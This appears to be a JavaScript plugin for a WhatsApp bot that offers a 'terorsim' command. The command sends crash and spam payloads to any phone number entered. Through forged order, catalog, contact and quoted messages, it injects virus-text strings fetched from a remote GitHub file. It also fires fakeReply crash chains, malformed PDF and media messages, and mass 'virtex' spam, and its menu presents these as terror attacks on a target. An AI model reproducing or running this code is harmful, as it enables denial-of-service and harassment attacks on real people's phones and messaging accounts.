import fs from 'fs'
import fetch from 'node-fetch'
import { sticker } from '../lib/sticker.js'

const { default: makeWASocket, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, downloadContentFromMessage, downloadHistory, proto, getMessage, generateWAMessageContent, prepareWAMessageMedia } = (await import('@adiwajshing/baileys')).default
let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {
	if (!text)return m.reply(`Contoh Penggunaan : *${_p + command}* <nomor>\n\n*Note :*\n*INGAT! FITUR INI BUKAN FITUR BUGWA',
 `)
	let thumb = fs.readFileSync('./thumbnail.jpg')
	let virus = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
	let virus2 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v26.txt")).text()
	let type = (args[0] || '').toLowerCase()

	const from = m.key.remoteJid
	//const participants = m.isGroup ? await groupMetadata.participants : ''
	let q = `Bug Tag From ${author}\n${text}`
	let sections = [{
		title: ' MENU BUG SMARTPHONE 💀',
rows: [
{title: `'😈⛓BUG SIM SIMPATI𝒇̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO BUG"},
{title: `😈⛓BUG SIM TELKOMSEL𝒄̶̶̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO BUG"},
{title: `'😈⛓BUG SIM TRI𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO BUG"},
{title: `'😈⛓BUG SIM SMARTFREN 𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO BUG"},
{title: `😈⛓BUG SIM INDOSAT𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO BUG"},
{title: `😈⛓BUG CALL SIMPATI𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO TEROR 100×"},
{title: `😈⛓BUG CALL TELKOMSEL𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO TEROR 100×"},
{title: `😈⛓BUG CALL TRI𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO TEROR 100×"},
{title: `😈⛓BUG CALL SMARTFREN𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO TEROR 100×"},
{title: `😈⛓BUG CALL INDOSAT𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO TEROR 100×"},
{title: `😈⛓SPAM VIRTEX +1000𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO SPAM VIRTEX 1000×"},]}]
    let listMessage = {
      text: 'HATI-HATI DENGAN FITUR BUG SIM OWNER❗ Jangan di gunakan dengan sembarangan, karena fitur ini sangat berbahaya jangan anda mencoba memakai nomor hp anda disebabkan nomor anda diteror, nomor SIM anda akan mendapatkan *TERORAN ERROR* yang sangat tragis dan menyebabkan down atau disebut riset SIM. Fitur bug ini bukan khusus wa tetapi nomor telepon/sim. *GUNAKAN UNTUK RIPPER ATAU SCAMER!*. Terimakasih telah Membaca Owner WannTrue BOT',
      footer: '*➳😈⛓⚔w̆̈e̶ WannTrue࿐ꪶ😈',
      buttonText: 'Silakam diklik Wann👿🔥̶',
      sections
      }

	//==================( Quoted ) =================//
	//# Kal
	const kal = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },
	"message": {
		"extendedTextMessage": {
			"text": `${packname}`,
			"previewType": "NONE",
			"contextInfo": {
				"stanzaId": "3EB0382EDBB2",
				"participant": "@s.whatsapp.net"
			}
		}
	}}
	//=================================================//		
	//# Troli
	const trol = { key: { fromMe: false, fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
	"message": {
		"orderMessage": {
			"orderId": "594071395007984",
			"thumbnail": fs.readFileSync('./thumbnail.jpg'),
			"itemCount": fsizedoc,
			"status": "INQUIRY",
			"surface": "CATALOG",
			"message": "",
			"orderTitle": `${packname}`,
			"sellerJid": "62857887347569@s.whatsapp.net",
			"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
			"totalAmount1000": fsizedoc,
			"totalCurrencyCode": "IDR"
		}
	}}
	//#Troli 2
	const ftrolii = { key: { fromMe: false, "participant":"0@s.whatsapp.net", "remoteJid": "@g.us"},
	"message": {
		orderMessage: { 		itemCount: fsizedoc,
			status: 200, 		thumbnail: thumb, 		surface: 200, 		message: `漏 ${packname}`,
			token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
			totalAmount1000: fsizedoc,
			totalCurrencyCode: "IDR",
			orderTitle: `${packname} ${virus2}`,
			sellerJid: '0@s.whatsapp.net'}}, 		contextInfo: { "forwardingScore":999,"isForwarded":true },
		sendEphemeral: true
	}	
	//=================================================//	
	//# Sticker
	const bugstik = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, "message": {
		"orderMessage": {
			"orderId": "594071395007984",
			"thumbnail": fs.readFileSync('./thumbnail.jpg'),
			"itemCount": fsizedoc,
			"status": "INQUIRY",
			"surface": "CATALOG",
			"message": `${packname}`,
			"orderTitle": `${packname}`,
			"sellerJid": "62857887347569@s.whatsapp.net",
			"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
			"totalAmount1000": fsizedoc,
			"totalCurrencyCode": "IDR"
		}
	}}
	//=================================================//
	//# Pdf
	const bugpdf = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
	message: {
		"imageMessage": { "mimetype": "image/jpeg", "caption": `${packname}`, "jpegThumbnail": thumb
		}
	}}
	//=================================================//   
	//# Vn
	const adehvn = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
	"message": {
		"locationMessage": {}
	}} 
	//=================================================//	   
	//# Image
	const bugimage = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
		"message": {
			"audioMessage": {
				"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
				"mimetype": "audio/aac",
				"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
				"fileLength": fsizedoc,
				"seconds": fsizedoc,
				"caption": `${packname}`,
				"ptt": false,
				"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
				"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
				"directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB",
				"mediaKeyTimestamp": "1632753911"
			}
		}
	}
	//=================================================//		
	//# Catalog
	const messa = await prepareWAMessageMedia({ image: fs.readFileSync('./thumbnail.jpg') }, { upload: conn.waUploadToServer })
	const catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
		"productMessage": {
		"product": {
			"productImage": messa.imageMessage,
			"productId": "4383282311765462",
			"title": `${packname}`,
			"description": `${virus2}`,
			"currencyCode": "IDR",
			"bodyText": `${virus}`,
			"footerText": `${packname}`,
			"priceAmount1000": fsizedoc,
			"productImageCount": 1,
			"firstImageId": 1,
			"salePriceAmount1000": fsizedoc,
			"retailerId": `${packname}`,
			"url": "wa.me/6283839200413"
		},
			"businessOwnerJid": "6283839200413@s.whatsapp.net",
		}
	}), { userJid: m.chat, quoted: ftrolii })	
	//=================================================//	
	//# Contact
	const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `${packname}${virus}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:${packname}\nitem1.TEL;waid=6281991410940:6281991410940\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}  
	//=================================================//   
	//# Text
	const main = {
		"key": {
			"fromMe": false,
			"participant": "0@s.whatsapp.net",
			...({"remoteJid":''})
			},
		"message":{
			"imageMessage":{
				"mimetype":"image/jpeg",
				"jpegThumbnail":fs.readFileSync('./thumbnail.jpg')
			}
		}
	}
	//=================================================//   

	switch (type) {
		case 'vn': {
			conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {audio: thumb, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
			//await m.reply(`Berhasil Mengirim Bug Vn Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'pdf': {
			conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {document: thumb, filename:`馃尀饢Ч蜏蛽汀蜏饾懘汀蜏饾懆汀蜏覊饾懘汀蜏饾懆汀蜏覊饾應汀蜏饾懚汀蜏饢Ч蛽蛽鬆嚍馂.pdf`, mimetype: 'application/pdf',}, {quoted: bugpdf})
			//await m.reply(`Berhasil Mengirim Bug Pdf Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'sticker': {
			let stiker = await sticker(null, 'https://telegra.ph/file/e2d2fac4853f1f923b35c.jpg', global.packname, global.author)
			conn.sendFile(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', stiker, 'sticker.webp', '', false, { asSticker: true }, {quoted: bugstik})
			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'bugimg': {
			conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {image: thumb, bugimage }, {quoted: bugimage})
		}
		break
		case 'bugcrash': {
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '622150996855@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '622150996855@s.whatsapp.net', 'B', '0@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '15517868074@s.whatsapp.net', 'B', '0@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '15517868074@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '447710173736@s.whatsapp.net', 'B', '0@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '447710173736@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		/*case 'bugkontakcok': {
			let res = await generateWAMessageFromContent(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {
				"contactMessage": {
					"vcard": "HAHaAhHAHAHA",
					"displayName": `${author}`,
					"contextInfo": {
						"forwardingScore": 3,
						"isForwarded": true
					}
				}
			}, {quoted: fkontaak, contextInfo:{}}) 
			conn.relayWAMessage(res)
			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
		}
		break*/
		case 'reactpc': {
			await conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {text: `${packname}` }, {quoted: trol})
			//await m.reply(`Berhasil Mengirim Bug React Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'bugtag': {
			if (!m.isGroup) return global.dfail('group',m,conn)
			conn.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: kal })
		}
		break
		case 'bugcatalog': {
			conn.relayMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', catalog.message, { messageId: catalog.key.id })
		}
		break
		case 'bugtextcrash': {
			conn.reply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', `${packname}`, main)
		}
		break
		case 'bugvid': {
			conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {video: thumb, bugimage, }, {quoted: bugimage})
		}
		break
		default:
			if (!/[01]/.test(command)) return conn.sendMessage(m.chat, listMessage, m)
			throw false
	}
	m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
}

handler.help = ['terorsim <nomer>']
handler.tags = ['main']
handler.command = /^terorsim$/i

handler.premium = false
handler.limit = false
handler.owner = false

export default handler
